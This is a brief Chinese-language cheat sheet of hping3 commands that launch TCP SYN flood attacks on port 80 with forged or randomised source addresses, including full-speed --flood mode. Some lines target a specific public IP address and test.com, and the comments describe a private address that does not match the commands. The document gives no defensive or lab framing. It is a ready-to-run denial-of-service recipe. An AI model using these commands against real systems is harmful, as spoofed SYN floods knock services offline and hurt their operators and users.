
使用
```shell
# 通过 eth0 网口。发送 SYN 报文 到 192.168.46.4:80。伪造源地址为192.168.1.222，时间间隔 1000us。
hping3 -I eth0 -S 192.168.46.4 -p 80 -a 192.168.1.222 -i u1000

# 通过 eth0 网口。发送 SYN 报文 到 192.168.46.4:80。伪造随机源地址，时间间隔 1000us。
hping3 -I eth0 -S 116.196.100.246 -p 80 --rand-source -i u10

# 通过 eth0 网口。发送 SYN 报文 到 192.168.46.4:80。伪造随机源地址，洪水攻击。
# 洪水攻击，速率最快的攻击。不会显示数据 和 丢包的统计。
hping3 -I eth0 -S 116.196.100.246 -p 80 --rand-source --flood

hping3  -S 116.196.100.246 -p 80 --rand-source --flood


hping3 -c 1200 -d 130 -S -w 64 -p 80 --flood --rand-source test.com
```